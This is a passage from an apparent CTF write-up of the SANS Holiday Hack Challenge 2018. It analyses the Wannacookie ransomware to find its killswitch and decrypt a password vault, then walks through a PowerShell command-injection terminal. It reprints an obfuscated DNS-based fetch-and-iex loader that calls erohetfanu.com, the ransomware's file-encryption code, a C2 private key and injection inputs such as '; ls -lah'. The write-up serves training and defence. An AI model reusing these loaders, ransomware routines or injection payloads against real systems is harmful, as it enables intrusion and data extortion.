pCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM
7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSz
ZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.
CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()

function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = &quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;; $h = &quot;&quot;; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name &quot;$f.erohetfanu.com&quot; -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name &quot;$i.$f.erohetfanu.com&quot; -Type TXT).strings}; iex($(H2A $h | Out-string))
</code></pre>

<h5 id="9c-stop-the-malware">9c) Stop the Malware<a class="headerlink" href="#9c-stop-the-malware" title="Permanent link">&para;</a></h5>
<blockquote>
<p>Identify a way to stop the malware in its tracks!</p>
<p>Erohetfanu.com, I wonder what that means? Unfortunately, Snort alerts show multiple domains, so blocking that one won't be effective.
I remember another ransomware in recent history had a killswitch domain that, when registered, would prevent any further infections.
Perhaps there is a mechanism like that in this ransomware? Do some more analysis and see if you can find a fatal flaw and activate it!</p>
</blockquote>
<p>Similar to the first de-obfuscation step, we remove <code>iex</code> from the <em>PowerShell</em> command to further deobfuscate this code. Due to the length of the returned output, we simply write the code to <code>wannacookie.min.ps1</code>, which is what the hex-string <code>77616E6E61636F6F6B69652E6D696E2E707331</code> translates to.</p>
<pre><code class="powershell">PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = &quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;; $h = &quot;&quot;; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name &quot;$f.erohetfanu.com&quot; -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name &quot;$i.$f.erohetfanu.com&quot; -Type TXT).strings}; ($(H2A $h | Out-string)) &gt; wannacookie.min.ps1
</code></pre>

<p>This retrieves a minified version of the ransomware's code. Although we can still reverse engineer the code with what we have, we attempt to retrieve the non-minified version by performing a request for <code>wannacookie.ps1</code>, or <code>77616e6e61636f6f6b69652e707331</code>, using the modified code.</p>
<pre><code class="powershell">PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = &quot;77616e6e61636f6f6b69652e707331&quot;; $h = &quot;&quot;; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name &quot;$f.erohetfanu.com&quot; -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name &quot;$i.$f.erohetfanu.com&quot; -Type TXT).strings}; ($(H2A $h | Out-string)) &gt; wannacookie.ps1
</code></pre>

<p>By analyzing the deobfuscated ransomware script, we notice an interesting code block at the beginning of the main wannacookie function.</p>
<pre><code class="powershell">$S1 = &quot;1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000
cdd5c5c10000000&quot;

if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {return}

if ($(netstat -ano | Select-String &quot;127.0.0.1:8080&quot;).length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne &quot;KRINGLECASTLE&quot;) {return}
</code></pre>

<p>Several things make these statements interesting:
-   They are if-statements that end the script if the condition is true.
-   They are located at the beginning of the main, wannacookie function, giving them a chance to stop any malicious activity if triggered.
-   The hex value <code>6B696C6C737769746368</code> from the subdomain in the first statement translates to <code>killswitch</code>.
-   The second statement halts execution if the host machine doesn't live on the <code>KRINGLECASTLE</code> domain. This gives evidence that it's an attack that directly targets Santa's network.</p>
<p>Like the previous deobfuscation techniques, we remove any potentially damaging code from the code block, modify it to output the desired information, and run it within PowerShell to see the decoded output. Another step for this particular challenge is that we much also import the various functions the "killswitch" method makes use of in order for the decoding process to work.</p>
<p>After analyzing the various nested functions, we can determine that the killswitch method decodes the domain by simply using an XOR decryption between <code>1f0f0202171d020c0b09075604070a0a</code> and the data retrieved from the CnC server, which is <code>66667272727869657268667865666B73</code> in this case. The full explaination can be found in the <em>Wannacookie Malware Analysis</em> appendix.</p>
<p>Our final code and output, sans the importing, is seen below.</p>
<pre><code class="powershell">PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; $S1 = &quot;1f8b08000000
0000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000&quot;
&gt;&gt; $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings)))

yippeekiyaa.aaay
</code></pre>

<p>Based on this output, we can determine that the killswitch domain used by Wannacookie is: <strong><em>yippeekiyaa.aaay</em></strong>
We are able to confim this through the Ho Ho Ho Daddy application.</p>
<p><img alt="Ho Ho Ho Daddy" src="challenges/9c-hohohodaddy.png" /></p>
<p><img alt="Domain Registered" src="challenges/9c-domainregister.png" /></p>
<p>Now by registering this domain name, any victim connected to Internet during the infection process will successfully resolve <em>yippeekiyaa.aaay</em>, saving them from potential damage.</p>
<h5 id="9d-recover-alabasters-password">9d) Recover Alabaster's Password<a class="headerlink" href="#9d-recover-alabasters-password" title="Permanent link">&para;</a></h5>
<blockquote>
<p>Recover Alabaster's password as found in the the encrypted password vault.</p>
<p>Yippee-Ki-Yay! Now, I have a ma... kill-switch!
Now that we don't have to worry about new infections, I could sure use your L337 security skills for one last thing.
As I mentioned, I made the mistake of analyzing the malware on my host computer and the ransomware encrypted my password database.
Take this <a href="https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip">zip</a> with a memory dump and my encrypted password database, and see if you can recover my passwords.
One of the passwords will unlock our access to the vault so we can get in before the hackers.</p>
</blockquote>
<p>Immediately following the killswitch and target verification functions, we see the ransomware's file encryption procedure. It first creates and sends back the encryption key by downloading the CnC server's public key via DNS (<code>server.crt</code>), generating a random, 256-bit AES encryption key, and sending that back to the server after encrypting the key using their public key. Afterwards, it encrypts the all <code>.elfdb</code> files on the machine using that key. Finally, it clears the <code>Hex_key</code> and <code>Byte_key</code> variables, reducing the chances for us to find the unencrypted keys within memory. However, the public key encrypted key may still be found.</p>
<p>The full analysis of this section can be read in the <em>Wannacookie Malware Analysis</em> appendix.</p>
<pre><code class="powershell">$pub_key = [System.Convert]::FromBase64String($(get_over_dns(
&quot;7365727665722E637274&quot;) ) )
$Byte_key = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]
([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00})
$Hex_key = $(B2H $Byte_key)
$Key_Hash = $(Sha1 $Hex_key)
$Pub_key_encrypted_Key = (Pub_Key_Enc $Byte_key $pub_key).ToString()
$cookie_id = (send_key $Pub_key_encrypted_Key)
$date_time = (($(Get-Date).ToUniversalTime() | Out-String) -replace &quot;`r`n&quot;)
[array]$future_cookies = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile+'\Desktop'),  
     $($env:userprofile+'\Documents'),$($env:userprofile+'\Videos')
     ,$($env:userprofile+'\Pictures'),
     $($env:userprofile+'\Music')) -Recurse | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname})
enc_dec $Byte_key $future_cookies $true
Clear-variable -Name &quot;Hex_key&quot;
Clear-variable -Name &quot;Byte_key&quot;
</code></pre>

<p>Similar to previous methods, we import all associated functions, remove all malicious code, and run this script within our own <em>PowerShell</em> terminal to discern the output of this script. Since the information that we're interested in is how the keys look within memory, we run this code block up until line 5, where it encrypts the AES key using the public key.</p>
<pre><code class="powershell">PS C:\Users\Bernard\Documentss\Netsec\sans2018&gt; $pub_key = [System.Convert]::FromBase64String($(get_over_dns(
&quot;7365727665722E637274&quot;) ) )
&gt;&gt; $Byte_key = ([System.Text.Encoding]::Unicode.GetBytes(
$(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00})
&gt;&gt; $Hex_key = $(B2H $Byte_key)
&gt;&gt; $Key_Hash = $(Sha1 $Hex_key)
&gt;&gt; $Pub_key_encrypted_Key = (Pub_Key_Enc $Byte_key $pub_key).ToString()
&gt;&gt;
PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; echo $Hex_key
c5f328393f9fab2ffcdb4f924738644d
PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; echo $Pub_key_encrypted_Key

be0d0a74f42f7a568dcc42564a7b0a6c4da572afa723dccbcee8019aedbbadc586ae
5411a85d41a5414d8bc0ae48b0b6ae1fcb17f92a5dbeb60c82f2e02a087ccaee0eb3
db5bd58a5f5d992f10f3364196326bb03639dbec2c24d346e86aee452508c5757c6a
a2f6721ebe11a52758afd0fb268e38597c9ec17b47e615d063665455bd0663a7bcf4
129174ab7d58da87861419445acbb30e6153e221e3f75d3678d16bc1f361d5b5612e
8e44a7bd1bafee35f87e1ba2c56d8dc47233092c59abb31f239be305a2099bca8ed1
73535c7f970b044179173ff0df527f999d779928d2ad4811334c6f2a4e24cd84c16b
53b95f06f959ae8a929811481dacffb690a9
</code></pre>

<p>This information gives us two two things to look for within the memory dump:
-   A 32-character hex string for the AES key
-   A 512-character hex string for the public key encrypted AES key</p>
<p>To accomplish this, we load the memory dump into "power_dump.py" to search for hex strings of 32-characters and 512-characters.</p>
<pre><code>================ Filters ================
1| LENGTH  len(variable_values) == 32
2| MATCHES  bool(re.search(r&quot;^[a-fA-F0-9]*$&quot;,variable_values))

[i] 5 powershell Variable Values found!

[...snip...]

: print all
033ecb2bc07a4d43b5ef94ed5a35d280
Variable Values #1 above ^
Type any key to go back and just Enter to Continue...
cf522b78d86c486691226b40aa69e95c
Variable Values #2 above ^
Type any key to go back and just Enter to Continue...
9e210fe47d09416682b841769c78b8a3
Variable Values #3 above ^
Type any key to go back and just Enter to Continue...
4ec4f0187cb04f4cb6973460dfe252df
Variable Values #4 above ^
Type any key to go back and just Enter to Continue...
27c87ef9bbda4f709f6b4002fa4af63c
Variable Values #5 above ^
Type any key to go back and just Enter to Continue...
</code></pre>

<pre><code>================ Filters ================
1| MATCHES  bool(re.search(r&quot;^[a-fA-F0-9]*$&quot;,variable_values))
2| LENGTH  len(variable_values) == 512

[i] 1 powershell Variable Values found!

[...snip...]

: print all
3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a18
49d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d81
1e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c58611
39c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83
218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407
d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b66
8109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc4999521
7d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a771525639
06a2c29c6d12f971
Variable Values #1 above ^
Type any key to go back and just Enter to Continue...
</code></pre>

<p>Although we found several candidates for encryption keys, none of them allow us to decrypt Alabaster's elfdb file. The only remaining option right now is to somehow decrypt the encrypted key by retrieving the server's private key.</p>
<p>Similar to what we did to grab the deobfuscated version of the malware, we import the <code>get_over_dns()</code> function to our <em>PowerShell</em> terminal and attempt to download <code>server.key</code> (<code>7365727665722e6b6579</code>), instead of <code>server.crt</code> (<code>7365727665722E637274</code>). Hopefully, we can retrieve the server's private key in case the attacker inadvertently left it available for public download. Upon attempting this, we find that we successfully retrieve the server's private key.</p>
<pre><code>PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; get_over_dns(&quot;7365727665722e6b6579&quot;);
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEiNzZVUbXCbMG
L4sM2UtilR4seEZli2CMoDJ73qHql+tSpwtK9y4L6znLDLWSA6uvH+lmHhhep9ui
W3vvHYCq+Ma5EljBrvwQy0e2Cr/qeNBrdMtQs9KkxMJAz0fRJYXvtWANFJF5A+Nq
jI+jdMVtL8+PVOGWp1PA8DSW7i+9eLkqPbNDxCfFhAGGlHEU+cH0CTob0SB5Hk0S
TPUKKJVc3fsD8/t60yJThCw4GKkRwG8vqcQCgAGVQeLNYJMEFv0+WHAt2WxjWTu3
HnAfMPsiEnk/y12SwHOCtaNjFR8Gt512D7idFVW4p5sT0mrrMiYJ+7x6VeMIkrw4
tk/1ZlYNAgMBAAECggEAHdIGcJOX5Bj8qPudxZ1S6uplYan+RHoZdDz6bAEj4Eyc
0DW4aO+IdRaD9mM/SaB09GWLLIt0dyhRExl+fJGlbEvDG2HFRd4fMQ0nHGAVLqaW
OTfHgb9HPuj78ImDBCEFaZHDuThdulb0sr4RLWQScLbIb58Ze5p4AtZvpFcPt1fN
6YqS/y0i5VEFROWuldMbEJN1x+xeiJp8uIs5KoL9KH1njZcEgZVQpLXzrsjKr67U
3nYMKDemGjHanYVkF1pzv/rardUnS8h6q6JGyzV91PpLE2I0LY+tGopKmuTUzVOm
Vf7sl5LMwEss1g3x8gOh215Ops9Y9zhSfJhzBktYAQKBgQDl+w+KfSb3qZREVvs9
uGmaIcj6Nzdzr+7EBOWZumjy5WWPrSe0S6Ld4lTcFdaXolUEHkE0E0j7H8M+dKG2
Emz3zaJNiAIX89UcvelrXTV00k+kMYItvHWchdiH64EOjsWrc8co9WNgK1XlLQtG
4iBpErVctbOcjJlzv1zXgUiyTQKBgQDaxRoQolzgjElDG/T3VsC81jO6jdatRpXB
0URM8/4MB/vRAL8LB834ZKhnSNyzgh9N5G9/TAB9qJJ+4RYlUUOVIhK+8t863498
/P4sKNlPQio4Ld3lfnT92xpZU1hYfyRPQ29rcim2c173KDMPcO6gXTezDCa1h64Q
8iskC4iSwQKBgQCvwq3f40HyqNE9YVRlmRhryUI1qBli+qP5ftySHhqy94okwerE
KcHw3VaJVM9J17Atk4m1aL+v3Fh01OH5qh9JSwitRDKFZ74JV0Ka4QNHoqtnCsc4
eP1RgCE5z0w0efyrybH9pXwrNTNSEJi7tXmbk8azcdIw5GsqQKeNs6qBSQKBgH1v
sC9DeS+DIGqrN/0tr9tWklhwBVxa8XktDRV2fP7XAQroe6HOesnmpSx7eZgvjtVx
moCJympCYqT/WFxTSQXUgJ0d0uMF1lcbFH2relZYoK6PlgCFTn1TyLrY7/nmBKKy
DsuzrLkhU50xXn2HCjvG1y4BVJyXTDYJNLU5K7jBAoGBAMMxIo7+9otN8hWxnqe4
Ie0RAqOWkBvZPQ7mEDeRC5hRhfCjn9w6G+2+/7dGlKiOTC3Qn3wz8QoG4v5xAqXE
JKBn972KvO0eQ5niYehG4yBaImHH+h6NVBlFd0GJ5VhzaBJyoOk+KnOnvVYbrGBq
UdrzXvSwyFuuIqBlkHnWSIeC
-----END PRIVATE KEY-----
</code></pre>

<p>First, we should confirm that this is the correct private key by matching its modulus with the public key's.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ openssl x509 -modulus -noout -in server.crt | openssl md5; openssl rsa -modulus -noout -in server.key | openssl md5

(stdin)= f5d6eee25830f8877e20fe4bf5a1d9ad
(stdin)= f5d6eee25830f8877e20fe4bf5a1d9ad
</code></pre>

<p>Now that we've confirmed that we have the corresponding private key, we can decrypt the encrypted AES key and use it to recover Alabaster's elfdb file.</p>
<p>First, we translate the potential key from a hex string to binary data.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ echo -ne 
&quot;3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4
a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672
d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d
2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf01978995
0d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029c
a4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c
75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268
af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d
7d47681a77152563906a2c29c6d12f971&quot; | xxd -r -p &gt; encrypted_key.key
</code></pre>

<p>Then, using openssl with PKCS#1 OAEP, we decrypt the encrypted key using the server's private key and convert it back to a hex string.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ openssl rsautl -decrypt -oaep -in encrypted_key.key -out encryption_key.key -inkey server.key
bernard@Bernard-PC:~/NetsecStudy/sans2018$ xxd -p encryption_key.key
fbcfc121915d99cc20a3d3d5d84f8308
</code></pre>

<p>Finally, by using the malware's own file decryption function, we can use the decoded AES encryption key to recover alabaster's passwords. This saves us from having to determine the file's IV and other various parameters to decrypt it on our own.</p>
<pre><code class="powershell">PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; $decKey = &quot;fbcfc121915d99cc20a3d3d5d84f8308&quot;
PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; $file = &quot;alabaster_passwords.elfdb.wannacookie&quot;
PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; Enc_Dec-File $(H2B $decKey) $file $false
</code></pre>

<p>Now that we've decrypted the passwords file, we learn that it is a SQLite database. Finally, we can simply open the file in a SQLite Database Browser to discover the password Alabaster needs: <strong><em>ED#ED#EED#EF#G#F#G#ABA#BA#B</em></strong></p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ file alabaster_passwords.elfdb
alabaster_passwords.elfdb: SQLite 3.x database, last written using SQLite version 3015002
</code></pre>

<p><img alt="Searching the Database" src="challenges/9d-dbbrowser.png" /></p>
<h4 id="10-who-is-behind-it-all">10) Who Is Behind It All?<a class="headerlink" href="#10-who-is-behind-it-all" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Who was the mastermind behind the whole KringleCon plan? And, in your <a href="mailto:SANSHolidayHackChallenge@counterhack.com">emailed answers</a> please explain that plan.</p>
<p>I'm seriously impressed by your security skills. How could I forget that I used Rachmaninoff as my musical password?</p>
</blockquote>
<p>We can access the <em>Piano Lock</em> on the right wall of Santa's Secret Room or through the independant website: https://pianolockn.kringlecastle.com/</p>
<p><img alt="Location" src="challenges/10-location.png" /></p>
<p><img alt="Piano Lock" src="challenges/10-lock.png" /></p>
<p>We first try directly playing the notes from Alabaster's password database, but the lock tells us that the key is incorrect.</p>
<p><img alt="Wrong Key" src="challenges/10-outoftune.png" /></p>
<p>After reading a hint in the badge menu we learn that we must transpose the password into the key of D, from the key of E. </p>
<blockquote>
<p><strong>Rachmaninoff</strong></p>
<p>From: Alabaster Snowball
Really, it's Mozart. And it should be in the key of D, not E.</p>
</blockquote>
<p>This is simply one whole-step down, or one letter. Playing the tune like this gives us the correct key and unlocks the vault.</p>
<p><img alt="Correct Key" src="challenges/10-correct.png" /></p>
<p>We can also check a tune by sending a GET request to https://pianolockn.kringlecastle.com/checkpass.php, with two GET parameters. <code>i</code> is the notes played and <code>resourceID</code> is <code>undefined</code>.</p>
<p>This reveals to us that the entire incident was planned out by <strong><em>Santa</em></strong>, who is looking to find new cybersecurity specialists for his operation next year.</p>
<p><img alt="Inside the Vault" src="challenges/10-insidevault.png" /></p>
<blockquote>
<p>You DID IT! You completed the hardest challenge. You see, Hans and the soldiers work for ME. I had to test you. And you passed the test!</p>
<p>You WON! Won what, you ask? Well, the jackpot, my dear! The grand and glorious jackpot!
You see, I finally found you!</p>
<p>I came up with the idea of KringleCon to find someone like you who could help me defend the North Pole against even the craftiest attackers.</p>
<p>That’s why we had so many different challenges this year.
We needed to find someone with skills all across the spectrum.</p>
<p>I asked my friend Hans to play the role of the bad guy to see if you could solve all those challenges and thwart the plot we devised.</p>
<p>And you did!</p>
<p>Oh, and those brutish toy soldiers? They are really just some of my elves in disguise.
See what happens when they take off those hats?</p>
<p>Based on your victory… next year, I’m going to ask for your help in defending my whole operation from evil bad guys.</p>
<p>And welcome to my vault room. Where's my treasure? Well, my treasure is Christmas joy and good will.</p>
<p>You did such a GREAT job! And remember what happened to the people who suddenly got everything they ever wanted?</p>
<p>They lived happily ever after.</p>
<p>- Santa</p>
</blockquote>
<p>Now we've finally completed the <strong><em>SANS Holiday Hack Challenge 2018</em></strong>!</p>
<h3 id="terminal-exercises">Terminal Exercises<a class="headerlink" href="#terminal-exercises" title="Permanent link">&para;</a></h3>
<h4 id="1-essential-editor-skills-bushy-evergreen">1) Essential Editor Skills (Bushy Evergreen)<a class="headerlink" href="#1-essential-editor-skills-bushy-evergreen" title="Permanent link">&para;</a></h4>
<p>You can find this terminal in the first floor lobby, just to the right of the entrance.</p>
<p><img alt="Location" src="terminals/1-location.png" /></p>
<blockquote>
<p>Hi, I'm Bushy Evergreen.
I'm glad you're here, I'm the target of a terrible trick.
Pepper says his editor is the best, but I don't understand why.
He's forcing me to learn vi.
He gave me a link, I'm supposed to learn the basics.
Can you assist me with one of the simple cases?</p>
</blockquote>
<pre><code>I'm in quite a fix, I need a quick escape.
Pepper is quite pleased, while I watch here, agape.
Her editor's confusing, though &quot;best&quot; she says - she yells!
My lesson one and your role is exit back to shellz.

-Bushy Evergreen

Exit vi.
</code></pre>

<p>We see that someone has cruelly trapped Bushy in the vi editor. Although relatively unintuitive, the escape method is quite simple. Typing a colon (<code>:</code>) to write an editor command, typing <code>q</code> to ready the 'quit editor' command, and pressing enter to issue the command.</p>
<pre><code>Loading, please wait......

You did it! Congratulations!

elf@16e18889037b:~$
</code></pre>

<blockquote>
<p>Wow, it seems so easy now that you've shown me how!
To thank you, I'd like to share some other tips with you.
Have you taken a look at the Orientation Challenge?
This challenge is limited to past SANS Holiday Hack Challenges from 2015, 2016, and 2017. You DO NOT need to play those challenges.
If you listen closely to Ed Skoudis' talk at the con, you might even pick up all the answers you need...
It may take a little poking around, but with your skills, I'm sure it'll be a wintergreen breeze!</p>
<p>- Bushy Evergreen</p>
</blockquote>
<h4 id="2-the-name-game-minty-candycane">2) The Name Game (Minty Candycane)<a class="headerlink" href="#2-the-name-game-minty-candycane" title="Permanent link">&para;</a></h4>
<p>This terminal is located just to the left of the first floor entranceway.</p>
<p><img alt="Location" src="terminals/2-location.png" /></p>
<blockquote>
<p>Hi, I'm Minty Candycane.
Can you help me? I'm in a bit of a fix.
I need to make a nametag for an employee, but I can't remember his first name.
Maybe you can figure it out using this Cranberry Pi terminal?
The Santa's Castle Onboarding System? I think it's written in PowerShell, if I'm not mistaken.
PowerShell itself can be tricky when handling user input. Special characters such as &amp; and ; can be used to inject commands.
I think that system is one of Alabaster's creations.
He's a little ... obsessed with SQLite database storage.
I don't know much about SQLite, just the .dump command.</p>
</blockquote>
<p>Based on the explaination from Minty, this is most likely a 'command injection' exercise.</p>
<pre><code>We just hired this new worker,
Californian or New Yorker?
Think he's making some new toy bag...
My job is to make his name tag.

Golly gee, I'm glad that you came,
I recall naught but his last name!
Use our system or your own plan,
Find the first name of our guy &quot;Chan!&quot;

-Bushy Evergreen

To solve this challenge, determine the new worker's first name and submit to runtoanswer.

 Press  1 to start the onboard process.
 Press  2 to verify the system.
 Press  q to quit.


Please make a selection: 
</code></pre>

<p>We begin attacking this exercise by examining the first option, starting the onboard process.</p>
<pre><code>Welcome to Santa's Castle!


At Santa's Castle, our employees are our family. We care for each other,
and support everyone in our common goals.

Your first test at Santa's Castle is to complete the new employee onboarding paperwork.
Don't worry, it's an easy test! Just complete the required onboarding information below.


Enter your first name.
: `whoami`
Enter your last name.
: $(hostname)
Enter your street address (line 1 of 2).
: ;
Enter your street address (line 2 of 2).
: '
Enter your city.
: &quot;
Enter your postal code.
:  -- 
Enter your phone number.
: # 
Enter your email address.
: .
Is this correct?


`whoami` $(hostname)
;
'
&quot;,  -- 
# 
.
y/n: y
Save to sqlite DB using command line
./sqlite3: Error: unknown option: -
Use -help for a list of options.
Press Enter to continue...: 
</code></pre>

<p>This output seems promising since we successfully caused an error in this query. However, after a bit of experimentation, there doesn't seem to be an immediate way to receive non-error output.</p>
<p>Next, we look into the second option, verifying the system. Based on the function's output, we find that this simply passes the inputted address into a ping command.</p>
<pre><code>Validating data store for employee onboard information.
Enter address of server: 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.044 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.050 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.053 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2049ms
rtt min/avg/max/mdev = 0.044/0.049/0.053/0.003 ms
onboard.db: SQLite 3.x database
Press Enter to continue...: 
</code></pre>

<p>Our next step is to check if this function is vulnerable to command injection. In the case of our first input, the full command passed to the system would be: <code>ping -c 3 127.0.0.1</code></p>
<p>However, this malicious input appends other commands after the ping command. The full command for this input would look like: <code>ping -c 3 ; ls -lah</code></p>
<p>After passing this input to the function, we receive a list of all files in the current directory, verifying that this input is injectable. </p>
<pre><code>Validating data store for employee onboard information.
Enter address of server: ; ls -lah
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
total 5.4M
drwxr-xr-x 1 elf  elf  4.0K Jan  8 23:26 .
drwxr-xr-x 1 root root 4.0K Dec 14 16:17 ..
-rw-r--r-- 1 elf  elf   220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 root root   95 Dec 14 16:13 .bashrc
drwxr-xr-x 3 elf  elf  4.0K Jan  8 23:26 .cache
drwxr-xr-x 3 elf  elf  4.0K Jan  8 23:26 .local
-rw-r--r-- 1 root root 3.8K Dec 14 16:13 menu.ps1
-rw-rw-rw- 1 root root  24K Dec 14 16:13 onboard.db
-rw-r--r-- 1 elf  elf   655 May 16  2017 .profile
-rwxr-xr-x 1 root root 5.3M Dec 14 16:13 runtoanswer
onboard.db: SQLite 3.x database
Press Enter to continue...: 
</code></pre>

<p>Our next step is to run the <code>runtoanswer</code> executable file that we see in the current directory. Here we discover that the last name of the employee we need to give to Minty is 'Chan'.</p>
<pre><code>Validating data store for employee onboard information.
Enter address of server: ; ./runtoanswer
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
Loading, please wait......



Enter Mr. Chan's first name: 
Sorry, I don't think that is correct answer.
onboard.db: SQLite 3.x database
Press Enter to continue...:  
</code></pre>

<p>To find out his first name, we dump the <code>onboard.db</code> database that's available in our current directory and pass its output to grep for it to search for 'Chan'. We receive a good match and reveal his first name is <strong><em>Scott</em></strong>.</p>
<pre><code>Validating data store for employee onboard information.
Enter address of server: ; sqlite3 onboard.db .dump | grep &quot;Chan&quot;
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
INSERT INTO &quot;onboard&quot; VALUES(84,'Scott','Chan','48 Colorado Way',NULL,'Los Angeles','90067','4017533509','scottmchan90067@gmail.com');
onboard.db: SQLite 3.x database
Press Enter to continue...: 
</code></pre>

<p>Armed with this information, we can execute the <code>runtoanswer</code> program and complete the exercise.</p>
<pre><code>Validating data store for employee onboard information.
Enter address of server: ; ./runtoanswer
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
Loading, please wait......


Enter Mr. Chan's first name: Scott

Congratulations!

onboard.db: SQLite 3.x database
Press Enter to continue...: 
</code></pre>

<blockquote>
<p>Thank you so much for your help! I've gotten Mr. Chan his name tag. I'd love to repay the favor.
Have you ever visited a website and seen a listing of files - like you're browsing a directory? Sometimes this is enabled on web servers.
This is generally unwanted behavior. You can find sleighloads of examples by searching the web for index.of.
On a website, it's sometimes as simple as removing characters from the end of a URL.
What a silly misconfiguration for leaking information!</p>
<p>- Minty Candycane</p>
</blockquote>
<h4 id="3-lethal-forensicelfication-tangle-coalbox">3) Lethal ForensicELFication (Tangle Coalbox)<a class="headerlink" href="#3-lethal-forensicelfication-tangle-coalbox" title="Permanent link">&para;</a></h4>
<p>This exericse is located on the second floor in the right hallway.</p>
<p><img alt="Location" src="terminals/3-location.png" /></p>
<blockquote>
<p>Hi, I'm Tangle Coalbox.
